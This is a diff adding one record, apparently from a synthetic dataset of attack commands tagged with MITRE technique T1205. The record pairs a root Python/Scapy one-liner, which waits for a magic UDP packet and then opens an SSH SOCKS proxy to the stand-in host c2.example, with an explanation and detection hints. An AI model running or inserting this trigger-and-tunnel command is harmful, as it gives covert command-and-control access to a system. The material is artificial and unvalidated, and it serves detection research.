@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo python3 -c \"from scapy.all import sniff; sniff(filter='udp and port 54321 and udp[8:4]=0xdeadbeef', count=1); import os; os.system('ssh -fN -D 1080 user@c2.example')\"",
+  "explanation": "Uses Scapy with root privileges to sniff for a UDP packet to port 54321 whose first 4 payload bytes equal 0xDEADBEEF. Upon seeing the magic packet, it launches an SSH SOCKS proxy (-D 1080) for covert comms. Detection: monitor for scapy/sniff usage by users; alert on UDP payload signatures; detect unexpected local SSH SOCKS proxies.",
+  "rationale_steps": [
+    "Wait for a magic UDP payload that serves as a covert trigger (requires sudo for raw capture).",
+    "Upon detection, start an SSH dynamic SOCKS proxy.",
+    "Use the proxy for further command and control.",
+    "Detect via process monitoring for scapy and anomalous SSH with -D flags."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-9e1e4684-ec5fc131",
+  "source_prompt_hash": "9e1e4684",
+  "timestamp_utc": "2025-09-30T05:53:05.592837Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
